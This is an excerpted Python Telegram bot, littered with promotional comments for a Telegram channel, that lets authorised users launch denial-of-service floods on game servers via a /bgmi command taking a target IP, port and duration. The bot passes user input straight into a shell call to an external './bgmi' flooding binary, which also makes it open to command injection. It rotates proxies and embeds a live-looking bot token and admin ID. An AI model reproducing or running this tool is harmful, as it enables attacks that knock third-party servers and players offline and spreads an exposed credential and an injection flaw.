...
# Join :- @SPG_ReporterYT #bgmiddoserpython
...
# Join :- @SPG_ReporterYT #from keep_alive import keep_alive
# Join :- @SPG_ReporterYT #keep_alive()
# Join :- @SPG_ReporterYT # insert your Telegram bot token here
bot = telebot.TeleBot('6856040638:AAGOFlmccOr2XNhKzUwHtoKE-TuS8ba-rNk')

# Join :- @SPG_ReporterYT # Admin user IDs
admin_id = ["974821913"]

# Join :- @SPG_ReporterYT # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @SPG_ReporterYT # File to store command logs
LOG_FILE = "log.txt"


# Join :- @SPG_ReporterYT # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @SPG_ReporterYT # Add more proxy addresses as needed
]
...
# Join :- @SPG_ReporterYT # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- @SPG_ReporterYT # Check if line is not empty
...
# Join :- @SPG_ReporterYT # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @SPG_ReporterYT # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- @SPG_ReporterYT # Function to clear logs
def clear_logs():
    try:
...
# Join :- @SPG_ReporterYT # Function to record command logs
...
# Join :- @SPG_ReporterYT # Function to handle the reply when free users run the /bgmi command
...
# Join :- @SPG_ReporterYT # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @SPG_ReporterYT # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @SPG_ReporterYT # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @SPG_ReporterYT # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @SPG_ReporterYT # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @SPG_ReporterYT # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @SPG_ReporterYT # Convert time to integer
            time = int(command[3])  # Join :- @SPG_ReporterYT # Convert port to integer
            if time > 240:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @SPG_ReporterYT # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @SPG_ReporterYT # Updated command syntax
    else:
...
# Join :- @SPG_ReporterYT # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :- @SPG_ReporterYT # Import the 'time' module for sleep functionality
import time
